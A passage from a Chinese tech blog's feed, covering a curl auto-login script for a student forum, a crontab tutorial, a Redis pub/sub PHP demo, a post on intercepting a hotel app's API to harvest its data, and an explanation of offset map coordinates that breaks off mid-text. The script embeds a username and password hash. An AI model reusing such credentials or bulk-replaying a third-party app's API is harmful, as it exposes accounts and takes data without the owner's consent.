class="built_in">cat</span> temp.html|sed -n <span class="string">&quot;/\&quot;loginform_/p&quot;</span> | sed <span class="string">&quot;s/&#x27;//g&quot;</span> | sed <span class="string">&quot;s/\&quot;//g&quot;</span> | sed <span class="string">&quot;s/,//g&quot;</span>| sed <span class="string">&quot;s/ /\n/g&quot;</span> | sed <span class="string">&quot;s/=/\n/g&quot;</span>| sed -n <span class="string">&quot;/^loginform_/p&quot;</span> | sed <span class="string">&quot;s/_/ /g&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line">cookietime=`<span class="built_in">cat</span> temp.html|sed -n <span class="string">&quot;/\&quot;cookietime_/p&quot;</span> | sed <span class="string">&quot;s/&#x27;//g&quot;</span> | sed <span class="string">&quot;s/\&quot;//g&quot;</span> | sed <span class="string">&quot;s/,//g&quot;</span>| sed <span class="string">&quot;s/ /\n/g&quot;</span> | sed -n <span class="string">&quot;/value=/p&quot;</span>|sed <span class="string">&quot;s/=/ /g&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"><span class="comment">#打印获取的三个值</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;formhash   = &quot;</span><span class="variable">$formhash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;loginhash  = &quot;</span><span class="variable">$loginhash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cookietime = &quot;</span><span class="variable">$cookietime</span></span><br><span class="line"><span class="comment">#登录的url的post的地址</span></span><br><span class="line">url=<span class="string">&quot;http://bbs.stuhome.net/member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;loginhash=<span class="variable">$loginhash</span>&amp;inajax=1&quot;</span></span><br><span class="line"><span class="comment">#用户名和密码，密码加密过</span></span><br><span class="line">username=ceshinimei</span><br><span class="line">password=145a303eb9d95ee3dcf47aa2a5823664</span><br><span class="line"><span class="comment">#向URL  POST的参数。注意需要用到url_encode</span></span><br><span class="line">formdata=<span class="string">&quot;formhash=<span class="variable">$formhash</span>&amp;referer=http%3A%2F%2Fbbs.stuhome.net%2Fforum.php&amp;loginfield=username&amp;username=<span class="variable">$username</span>&amp;password=<span class="variable">$password</span>&amp;questionid=0&amp;answer=&amp;cookietime=<span class="variable">$cookietime</span>&amp;loginsubmit=true&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$url</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$formdata</span></span><br><span class="line"><span class="comment">#我他妈的在命令行里面也不想和ie扯上关系</span></span><br><span class="line"><span class="comment">#-A  user-agent </span></span><br><span class="line"><span class="comment">#-x proxy</span></span><br><span class="line"><span class="comment">#-b post data with cookie</span></span><br><span class="line"><span class="comment">#-s silent,without other message output</span></span><br><span class="line"><span class="comment">#-d data which you want to post </span></span><br><span class="line"><span class="comment">#temp_login.html --&gt; for analyse login status ... </span></span><br><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36&quot;</span> -x 127.0.0.1:8888 -b cookie.txt -D cookie.txt -s -d <span class="variable">$formdata</span> <span class="variable">$url</span> &gt; temp_login.html</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;`grep &quot;</span>欢迎您回来<span class="string">&quot; temp_login.html`&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;登录失败&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;登录成功啦，哈哈哈&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;end shell code ...&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>最新研究sed和awk，写了一个简单的河畔自动登录脚本。。。可以改一下，加上crontab实现长久在线挂水滴，哈哈。。<br>ps：sed的正则似乎不一样，但是sed是如此的强大。。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ul><li><a href="http://www.cnblogs.com/ai616818/archive/2011/07/06/2099075.html">http://www.cnblogs.com/ai616818/archive/2011/07/06/2099075.html</a>  sed</li><li><a href="http://www.cnblogs.com/subsir/articles/2632412.html">http://www.cnblogs.com/subsir/articles/2632412.html</a>   curl 一些例子</li><li><a href="http://blog.csdn.net/gzh0222/article/details/8559595">http://blog.csdn.net/gzh0222/article/details/8559595</a>   curl 一些例子</li><li>man curl </li><li>Sed与awk第二版</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> curl </tag>
            
            <tag> sed </tag>
            
            <tag> awk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 计划任务 — crontab</title>
      <link href="/2013/09/21/Linux%20%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%20%E2%80%94%20crontab/"/>
      <url>/2013/09/21/Linux%20%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%20%E2%80%94%20crontab/</url>
      
        <content type="html"><![CDATA[<p>原文：<a href="http://letcodefly.com/article/1">Linux 计划任务 — crontab</a></p><p>作者：<a href="http://weibo.com/singleseeker">singleseeker</a></p><h2 id="cron-简介"><a href="#cron-简介" class="headerlink" title="cron 简介"></a>cron 简介</h2><p><code>cron</code> 是 UNIX, SOLARIS，LINUX 下的一个十分有用的工具。通过 <code>cron</code> 脚本能使计划任务定期地在系统后台自动运行。</p><h2 id="cron-命令"><a href="#cron-命令" class="headerlink" title="cron 命令"></a>cron 命令</h2><ul><li><code>crontab -e</code> – 编辑该用户的 crontab，当指定 crontab 不存在时新建。</li><li><code>crontab -l</code> – 列出该用户的 crontab。</li><li><code>crontab -r</code> – 删除该用户的 crontab。</li><li><code>crontab -u&lt;用户名称&gt;</code> – 指定要设定 crontab 的用户名称。</li></ul><h2 id="Linux-Crontab-格式"><a href="#Linux-Crontab-格式" class="headerlink" title="Linux Crontab 格式"></a>Linux Crontab 格式</h2><p>表格: Crontab 字段与允许的值 (Linux Crontab)</p><table><thead><tr><th>字段</th><th>描述</th><th>允许的值</th></tr></thead><tbody><tr><td>分钟</td><td>一小时的第几分</td><td>0-59</td></tr><tr><td>小时</td><td>一天的第几小时</td><td>0-23</td></tr><tr><td>日期</td><td>一个月的的第几天</td><td>1-31</td></tr><tr><td>月份</td><td>一年的第几个月</td><td>1-12</td></tr><tr><td>周几</td><td>一周的第几天</td><td>0-6</td></tr><tr><td>命令</td><td>命令</td><td>可以被执行的任何命令</td></tr></tbody></table><h2 id="cron-实例"><a href="#cron-实例" class="headerlink" title="cron 实例"></a>cron 实例</h2><h3 id="1-特定时间执行"><a href="#1-特定时间执行" class="headerlink" title="1. 特定时间执行"></a>1. 特定时间执行</h3><p>cron 的基本用法是在特定的时间执行一项任务，如下是 6 月 10 上午 8:30 执行 Full backup shell script。<br><strong>要注意的是时间字段采用的是 24 小时制，如果是下午 8 点，则改写为 20 点</strong></p><pre><code>30 08 10 06 * /home/ramesh/full-backup</code></pre><ul><li><code>30</code> – 第 30 分钟</li><li><code>08</code> – 早上 8 点</li><li><code>10</code> – 10 号</li><li><code>06</code> – 第 6 个月 (6 月)</li><li><code>*</code> – 一周的任何一天</li></ul><h3 id="2-安排多个实例（比如一天执行两次）"><a href="#2-安排多个实例（比如一天执行两次）" class="headerlink" title="2. 安排多个实例（比如一天执行两次）"></a>2. 安排多个实例（比如一天执行两次）</h3><p>下面的增量备份脚本每天执行两次。</p><p>每天于 11:00, 16:00 执行，逗号两侧的时间都会执行。</p><pre><code>00 11,16 * * * /home/ramesh/bin/incremental-backup</code></pre><ul><li><code>00</code> – 第 0 分钟 (每小时开时)</li><li><code>11,16</code> – 早上 11 点与下午 4 点</li><li><code>*</code> – 每天</li><li><code>*</code> – 每个月</li><li><code>*</code> – 一周的任何一天</li></ul><h3 id="3-让任务只在特定时间执行（比如仅当工作日时执行）"><a href="#3-让任务只在特定时间执行（比如仅当工作日时执行）" class="headerlink" title="3. 让任务只在特定时间执行（比如仅当工作日时执行）"></a>3. 让任务只在特定时间执行（比如仅当工作日时执行）</h3><p>下面这个例子是每天 9:00-16:00 检查数据库状态（包括周六）</p><pre><code>00 09-18 * * * /home/ramesh/bin/check-db-status</code></pre><ul><li><code>00</code> – 第 0 分钟 (每小时开时)</li><li><code>09-18</code> – 9 点, 10 点, 11 点, 12 点, 下午 1 点, 下午 2 点, 下午 3 点, 下午 4 点, 下午 5 点, 下午 6 点</li><li><code>*</code> – 每天</li><li><code>*</code> – 每个月</li><li><code>*</code> – 一周的任何一天</li></ul><p>如果只想工作日执行此操作</p><pre><code>00 09-18 * * 1-5 /home/ramesh/bin/check-db-status</code></pre><ul><li><code>00</code> – 第 0 分钟 (每小时开时)</li><li><code>09-18</code> – 9 点, 10 点, 11 点, 12 点, 下午 1 点, 下午 2 点, 下午 3 点, 下午 4 点, 下午 5 点, 下午 6 点</li><li><code>*</code> – 每天</li><li><code>*</code> – 每个月</li><li><code>1-5</code> – 周一, 周二, 周三, 周四和周五 (工作日)</li></ul><h3 id="4-如何查看-cron-定时任务"><a href="#4-如何查看-cron-定时任务" class="headerlink" title="4. 如何查看 cron 定时任务"></a>4. 如何查看 cron 定时任务</h3><p>查看当前用户定时任务</p><pre><code>ramesh@dev-db$ crontab -l</code></pre><p>查看 ROOT 用户定时任务，用root登入su root，再执行 <code>crontab -l</code></p><pre><code>root@dev-db# crontab -lno crontab for root</code></pre><p>查看其它用户定时任务</p><pre><code>root@dev-db# crontab -u sathiya -l@monthly /home/sathiya/monthly-backup00 09-18 * * * /home/sathiya/check-db-status</code></pre><h3 id="5-如何编辑-cron-定时任务"><a href="#5-如何编辑-cron-定时任务" class="headerlink" title="5. 如何编辑 cron 定时任务"></a>5. 如何编辑 cron 定时任务</h3><pre><code>ramesh@dev-db$ crontab -e</code></pre><h3 id="6-安排每分钟都执行定时任务"><a href="#6-安排每分钟都执行定时任务" class="headerlink" title="6. 安排每分钟都执行定时任务"></a>6. 安排每分钟都执行定时任务</h3><p>理论情况下，没有每分钟都要执行的 shell，但下面这个例子，让我们更好的了解 crontab</p><pre><code>* * * * * 命令</code></pre><p><code>*</code> 代表着所有可能取到的值，除了直接用 <code>*</code> 外，下面的几个例子也较为常用</p><ul><li>当指定 <code>*/5</code> 在分钟字段，代表每五分钟。</li><li>当指定 <code>0-10/2</code> 在分钟字段，代表在前十分钟的每两分钟</li></ul><p>上面的例子对于其它四个字段同样试用</p><h3 id="7-安排后台每十分钟执行定时任务"><a href="#7-安排后台每十分钟执行定时任务" class="headerlink" title="7. 安排后台每十分钟执行定时任务"></a>7. 安排后台每十分钟执行定时任务</h3><pre><code>*/10 * * * * /home/ramesh/check-disk-space</code></pre><p>有一些特殊的例子，可以用关键字替代上述五个字段– <code>reboot</code>, <code>midnight</code>, <code>yearly</code>, <code>hourly</code></p><p>Table: Cron special keywords and its meaning</p><table><thead><tr><th>Keyword</th><th>Equivalent</th></tr></thead><tbody><tr><td>@yearly</td><td>0 0 1 1 *</td></tr><tr><td>@daily</td><td>0 0 * * *</td></tr><tr><td>@hourly</td><td>0 * * * *</td></tr><tr><td>@reboot</td><td>重启时运行</td></tr></tbody></table><h3 id="8-每一年的第一分钟执行定时任务（-yearly）"><a href="#8-每一年的第一分钟执行定时任务（-yearly）" class="headerlink" title="8. 每一年的第一分钟执行定时任务（@yearly）"></a>8. 每一年的第一分钟执行定时任务（@yearly）</h3><p>下面的例子将在每一年的 1 月 1 日 0:00 执行</p><pre><code>@yearly /home/ramesh/red-hat/bin/annual-maintenance</code></pre><h3 id="9-每月执行定时任务（-mothly）"><a href="#9-每月执行定时任务（-mothly）" class="headerlink" title="9. 每月执行定时任务（@mothly）"></a>9. 每月执行定时任务（@mothly）</h3><p>下面的例子将在每月 1 日 0:00 执行</p><pre><code>@monthly /home/ramesh/suse/bin/tape-backup</code></pre><h3 id="10-每天执行定时任务（-daily）"><a href="#10-每天执行定时任务（-daily）" class="headerlink" title="10. 每天执行定时任务（@daily）"></a>10. 每天执行定时任务（@daily）</h3><p>下面的例子将在每天 0:00 执行</p><pre><code>@daily /home/ramesh/arch-linux/bin/cleanup-logs &quot;day started&quot;</code></pre><h3 id="11-每次重启时执行定时任务（-reboot）"><a href="#11-每次重启时执行定时任务（-reboot）" class="headerlink" title="11. 每次重启时执行定时任务（@reboot）"></a>11. 每次重启时执行定时任务（@reboot）</h3><pre><code>@reboot CMD</code></pre><h3 id="12-如何用-mail-关键字禁止-x2F-重定向-cron-的邮件"><a href="#12-如何用-mail-关键字禁止-x2F-重定向-cron-的邮件" class="headerlink" title="12. 如何用 mail 关键字禁止&#x2F;重定向 cron 的邮件"></a>12. 如何用 mail 关键字禁止&#x2F;重定向 cron 的邮件</h3><p>默认情况下，crontab 将向布置定时任务的管理员发送邮件，如果想重定向此用户，添加并更新 MAIL</p><pre><code>ramesh@dev-db$ crontab -lMAIL=&quot;ramesh&quot;@yearly /home/ramesh/annual-maintenance*/10 * * * * /home/ramesh/check-disk-space</code></pre><p>如果不想任何人接收，则直接将 MAIL 置空</p><h3 id="13-如何系秒每执行一个定时任务"><a href="#13-如何系秒每执行一个定时任务" class="headerlink" title="13. 如何系秒每执行一个定时任务"></a>13. 如何系秒每执行一个定时任务</h3><p>无法安排每秒执行，因为最小处理单元是分钟，另一方面，没有什么理由让我们每秒都执行一任务</p><h3 id="14-cron-中的-PATH-变量"><a href="#14-cron-中的-PATH-变量" class="headerlink" title="14. cron 中的 PATH 变量"></a>14. cron 中的 PATH 变量</h3><p>上面的例子都是用绝对的路径</p><p>如果你想用相对的路径，设置环境变量可以在 crontab 增加</p><pre><code>ramesh@dev-db$ crontab -lPATH=/bin:/sbin:/usr/bin:/usr/sbin:/home/ramesh@yearly annual-maintenance*/10 * * * * check-disk-space</code></pre><h3 id="15-从-cron-文件中定义-cron-任务"><a href="#15-从-cron-文件中定义-cron-任务" class="headerlink" title="15. 从 cron 文件中定义 cron 任务"></a>15. 从 cron 文件中定义 cron 任务</h3><p>除了直接编辑外，你也可以先在一个文件中编辑好任务，再导入</p><pre><code>ramesh@dev-db$ crontab -lno crontab for ramesh$ cat cron-file.txt@yearly /home/ramesh/annual-maintenance*/10 * * * * /home/ramesh/check-disk-spaceramesh@dev-db$ crontab cron-file.txtramesh@dev-db$ crontab -l@yearly /home/ramesh/annual-maintenance*/10 * * * * /home/ramesh/check-disk-space</code></pre><p>应用时要注意，此操作会删除原有的cron任务。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> cron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis publish &amp; subscribe php</title>
      <link href="/2013/07/03/linux-redis-publish&amp;subscribe-php/"/>
      <url>/2013/07/03/linux-redis-publish&amp;subscribe-php/</url>
      
        <content type="html"><![CDATA[<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><blockquote><p>tools : redis at ubuntu13.04 64bit<br>php   : PHP 5.4.9-4ubuntu2.1<br>redis : Redis 2.6.14 ,64 bit </p></blockquote><ol><li>install php (nginx + apache2 + php + mysql ) etc …</li><li>install redis (@see <a href="http://www.redis.io/download">http://www.redis.io/download</a> #installtion)</li><li>install phpredis ext (@see <a href="https://github.com/nicolasff/phpredis">https://github.com/nicolasff/phpredis</a>)</li><li>run…</li></ol><h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><p>file: pub.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis.php&quot;</span>;</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">publish</span>(<span class="string">&quot;tv1&quot;</span>,<span class="string">&quot;aaaa&quot;</span>); <span class="comment">/* channel name &#x27;tv1&#x27;*/</span></span><br></pre></td></tr></table></figure><p>file:sub.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params"><span class="variable">$redis</span>,<span class="variable">$channel</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$channel</span>.<span class="string">&quot;-----&quot;</span>.<span class="variable">$content</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">psubscribe</span>(<span class="keyword">array</span>(<span class="string">&quot;*&quot;</span>),<span class="string">&quot;callback&quot;</span>); <span class="comment">/* psubscribe  used with patten , subscribe used with full channel name.*/</span></span><br></pre></td></tr></table></figure><p>file:sub.html ( with jquery.js)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;aa&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;jquery.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gets</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;sub.php&#x27;</span>,function(data)&#123;</span><br><span class="line"><span class="keyword">if</span>(data)&#123;</span><br><span class="line">$(<span class="string">&quot;#aa&quot;</span>).<span class="title function_ invoke__">append</span>(data);</span><br><span class="line"><span class="title function_ invoke__">gets</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">gets</span>(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">gets</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>core redis file: redis.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="number">6379</span>);</span><br><span class="line"><span class="comment">//$redis-&gt;auth(&quot;123&quot;);</span></span><br></pre></td></tr></table></figure><p>then. see <a href="http://localhost:port/redis/sub.html">http://localhost:port/redis/sub.html</a><br>visit url :<a href="http://localhost:port/redis/pub.php">http://localhost:port/redis/pub.php</a> , (for publish message on channel named “<code>tv1</code>“)</p><h2 id="Attention"><a href="#Attention" class="headerlink" title="Attention"></a>Attention</h2><p>same ip will recevie only once published message , different ip will receive every message</p><h2 id="See-more"><a href="#See-more" class="headerlink" title="See more"></a>See more</h2><ul><li><a href="https://github.com/nicolasff/phpredis#pubsub">https://github.com/nicolasff/phpredis#pubsub</a></li><li><a href="https://github.com/nicolasff/">https://github.com/nicolasff/</a></li><li><a href="http://www.redis.io/download">http://www.redis.io/download</a> ;</li><li><a href="http://www.searchdatabase.com.cn/showcontent_64755.htm">http://www.searchdatabase.com.cn/showcontent_64755.htm</a></li><li><a href="http://www.springload.cn/springload/detail/331">http://www.springload.cn/springload/detail/331</a></li><li><a href="http://www.cnblogs.com/weafer/archive/2011/09/21/2184059.html">http://www.cnblogs.com/weafer/archive/2011/09/21/2184059.html</a></li><li>source from  <a href="http://vdisk.weibo.com/s/z-JIj1kqihA5">http://vdisk.weibo.com/s/z-JIj1kqihA5</a>  Redis实现新浪微博即时聊天系统.rar   sub.php have one error</li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我想要找全国的酒店信息怎么办？</title>
      <link href="/2013/05/31/%E6%88%91%E6%83%B3%E8%A6%81%E6%89%BE%E5%85%A8%E5%9B%BD%E7%9A%84%E9%85%92%E5%BA%97%E4%BF%A1%E6%81%AF%E6%80%8E%E4%B9%88%E5%8A%9E/"/>
      <url>/2013/05/31/%E6%88%91%E6%83%B3%E8%A6%81%E6%89%BE%E5%85%A8%E5%9B%BD%E7%9A%84%E9%85%92%E5%BA%97%E4%BF%A1%E6%81%AF%E6%80%8E%E4%B9%88%E5%8A%9E/</url>
      
        <content type="html"><![CDATA[<p>今日需要获取一些数据，这些数据从网上找不到下载的地方。这里以酒店数据为例。下同，今日想获取全国的酒店 LBS 信息的数据，包括但不局限于酒店名称，酒店经纬度，酒店入住价格等信息。</p><p>于是想到可以分析现有 APP 接口得到数据，通常来讲，APP 接口的返回的数据是 json 和 xml 格式的。<br>所需工具：抓包工具 Wireshark 之类的，代理工具(用于在手机或者是 Pad 上使用)，为了方遍，直接采用 Fiddler2 工具，自带有代理选项<br>手机客户端或者是 Pad 客户端上设置好代理，这个不多说。<br>打开 APP，刷几个列表，发现 Fiddle 里面就有很多数据了，包括本身这个 app 的，还有这个 app 的统计信息，一般的没战略的 app 可能会没有统计信息。</p><p>好吧。。。在 fiddle 里面找到一个请求，是 http 的，post，有 host，有 param，本地构造。</p><p><img src="/assets/images/hotel.jpg" alt="alt text"></p><pre><code>&lt;html&gt;    &lt;form method=&quot;post&quot; action=&quot;http://host:port/Finder.php?type=city_hot_zones&amp;city_id=1&amp;client_version=1.6.4&amp;client_agent=iPad&amp;market=AppStore&quot;&gt;        &lt;input name=&quot;type&quot; value=&quot;city_hot_zones&quot;&gt;        &lt;input name=&quot;city_id&quot; value=&quot;1&quot;&gt;        &lt;input name=&quot;client_version&quot; value=&quot;1.6.4&quot;&gt;        &lt;input name=&quot;client_agent&quot; value=&quot;iPad&quot;&gt;        &lt;input name=&quot;market&quot; value=&quot;AppStore&quot;&gt;        &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;&lt;/html&gt;</code></pre><p>ok，然后浏览器访问，发现返回是 xml 的数组，包含名字和这个酒店的经纬度。</p><p><img src="/assets/images/hotel-result.jpg" alt="alt text" title="Title"></p><p>于是乎，如果可以构造请求，那么这个 app 上面的所有的地理位置数据理论上讲是都可以下载了。httpclient 模拟请求 over，然后等数据。。。</p><p><strong>反思</strong> 中间的数据是不是应该采用加密措施。</p><p>不要说就我想到这么搞，其实他们的数据也是这么搞到的，说不定哈。。。<br>分析一个 APP—从功能上，从界面设计上，从盈利模式上，从市场推广上，现在到了，从数据交换的协议上。。。</p><h1 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h1><ul><li>Fiddler 教程 .<a href="http://www.cnblogs.com/TankXiao/archive/2012/02/06/2337728.html">http://www.cnblogs.com/TankXiao/archive/2012/02/06/2337728.html</a></li><li>类似的工具还有 tcpdump,wireshark 等。。。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>地图坐标偏移</title>
      <link href="/2013/05/30/%E5%9C%B0%E5%9B%BE%E5%9D%90%E6%A0%87%E5%81%8F%E7%A7%BB/"/>
      <url>/2013/05/30/%E5%9C%B0%E5%9B%BE%E5%9D%90%E6%A0%87%E5%81%8F%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p>偏移的起因：国家测绘局以国家安全为理由，用法律的形式对所有在天朝发行的地图类产品加了强制性规范，要求所有地图类产品都必须使用国家测绘局的一种加偏移的算法，对地图的真实坐标进行加偏移处理，之后才可能通过审批准许上市。因此，天朝的所有官方及商用地图的坐标都是偏移的，这种偏移属于非线性的，偏移量在 300 至 500 米不等，偏移方向也不定。这种加过偏移的地图坐标就是所谓“火星坐标”。</p><p>GPS 接收机本身接收卫星的信号，计算出本机所在位置的经纬度，在没有做特别处理的时候，这个经纬度是正确的。但是如果 GPS 支持加载地图的话，这个 GPS 中的地图就得受上述第一条法规的约束了，所以正式在天朝销售的行货 GPS 设备中的地图必须也得加偏移，处理成火星坐标。</p><p>问题来了，如果仅仅是地图搞成火星坐标，但 GPS 仍然输出真实坐标的话，就会发生 GPS 的定位（及导航）跟地图不能吻合的问题。于是，只好在 GPS 软件中设置一个使用同样算法的加偏移功能。GPS 先从卫星上得到真实坐标，然后经过加偏移程序转换成火星坐标，由于是同一个算法，所以经过软件加偏移的坐标能跟同样加了偏移的地图吻合，就是“歪到一起”了。这样就可以用 GPS 正常导航了——但这台 GPS 设备输出的坐标仍然是火星坐标，放到 Google Earth 上面是没法正常吻合的。</p><p>由于 Google Earth 属于卫星照片，它不是地图，所以不受天朝测绘法的约束，因此 Google Earth 的坐标是真实坐标。这样，问题又来了，当你使用天朝处理过的 GPS 导出火星坐标（或航迹），企图把它放到 Google Earth 上面看看自己都走了哪些路的时候，因为 Google Earth 照片的坐标是真实的，而你的 GPS 导出的坐标是火星坐标，二者就对不上号了，你也许会看到在 google Earth 上，你开着车从别人的楼顶上飞过去，或者打湖里面漂过去。</p><p>水货 GPS 因为是洋鬼子的产品，原本并非销往天朝的，洋鬼子不会玩这种加偏移的买卖，所以水货 GPS 设备，如果使用机器原带的地图的话，得到的坐标（或者航迹）是真实正确的，这就是水货机器的无偏地图。但是洋鬼子的设备中一般没有中文地图，如果你把天朝的官方或者正式发布的商用地图放到水货 GPS 设备里面的话，就会发生第 3 条前面说的问题：设备的真实坐标跟天朝特殊地图的火星坐标不吻合——出现偏移——无法正常导航。</p><p>由于火星坐标的一系列问题，众民间人士根据那个加偏移算法自行折腾出了很多纠正了偏移的地图，这些地图的坐标是正确的。这样的地图拿到水货 GPS 设备上，因为水货 GPS 输出的坐标是真实的，所以可以完美配合工作，正确导航定位，并且输出正确的坐标——放到 Google Earth 上也是正确的。</p><p>天朝行货 GPS 设备软件中的加偏移功能，是通过一个所谓空心地图文件（或者 28 类地图，或者快拼模块）来触发启动偏移程序的，如果用户安装非本机自带的，但属于天朝官方或者正式发布的商用地图，那要配合空心地图文件（或者把地图类别设置为 28），从而让 GPS 软件中的加偏移程序启动，使得 GPS 输出火星坐标，跟地图的火星坐标吻合，如此才能正常导航——但这台 GPS 设备输出的坐标仍然是火星坐标，放到 Google Earth 上面是没法正常吻合的。</p><p>天朝行货 GPS 设备，如果要得到真实坐标，使用民间的纠偏地图，就得把那个空心地图文件移除（或把原机自带的 28 类地图移除&#x2F;取消，或把同样作用的快拼弄掉），这样 GPS 设备输出真实的坐标，才能跟纠偏地图的正确坐标吻合，实现正确导航定位，并且输出正确的坐标——放到 Google Earth 上也是正确的。不过，在天朝行货 GPS 上不能同时使用火星坐标地图和纠偏地图，否则必然有一个没法正常导航定位。</p><p>水货 GPS 设备用民间的简体中文刷机，一般来说也没有那个加偏移程序，所以要使用纠偏地图或者无偏地图。不能使用天朝官方的火星坐标地图，不然就对不上号。</p><p>国家 Bao Mi 插件，也叫做加密插件或者加偏或者 SM 模组，其实就是对真实坐标系统进行人为的加偏处理，按照几行代码的算法，将真实的坐标加密成虚假的坐标，而这个加偏并不是线性的加偏，所以各地的偏移情况都会有所不同。而加密后的坐标也常被人称为火星坐标系统，这是我们的国家又一个伟大的发明，让国外的 Zheng Fu 和企业等，都看不懂我们的坐标系统。</p><p>其实很少有人知道国家 Bao Mi 插件问题，但作为导航电子地图产业或者汽车导航产业中的人，多多少少都会了解到这个问题。国家是出于国家安全考虑，将我们看到的真实的坐标变成假的虚拟的坐标，这样，我们的国家就安全了，不会被恐怖分子破坏了。最简单的举例来说，比如鸟巢吧，你真实的坐标是这个，加密后就成了那个，导航电子地图上看到的就是那个，那么人家导弹要是攻击那个的时候，那么导弹就打不中我们的鸟巢啦，我们的鸟巢就安全了。不过，个人担心这样加密后没有打中鸟巢，会不会打中水立方呢，可能是无心插柳柳成荫了。</p><p>具体说说这个 Bao Mi 插件的问题吧，是如何运作的呢？</p><p>现在，所有的电子地图所有的导航设备，都需要加入国家 Bao Mi 插件。第一步，地图公司测绘地图,测绘完成后,送到国家测绘局，将真实坐标的电子地图，加密成“火星坐标”，这样的地图才是可以出版和发布的，然后才可以让 GPS 公司处理。第二步，所有的 GPS 公司，只要需要汽车导航的，需要用到导航电子地图的，统统需要在软件中加入国家 Bao Mi 算法，将 COM 口读出来的真实的坐标信号，加密转换成国家要求的 Bao Mi 的坐标，这样，GPS 导航仪和导航电子地图就可以完全匹配啦，GPS 也就可以正常工作啦。</p><p>所以，所有的导航电子地图公司，像四维图新、瑞图、易图通、高德等等，都需要将自己的电子地图拿到国家测绘局进行加密处理，而所有的导航软件公司，都需要将自己的导航软件中加入国家测绘局提供的加密算法的代码。而这一段代码，就是国家的机密，不是公开的，每次去国家测绘局加密处理都需要预约并在封闭的环境中进行，编译完成后需要是在主程序的 exe 中，而不能编译在外部 dll 等文件中。</p><p>当然，国家的 Bao Mi 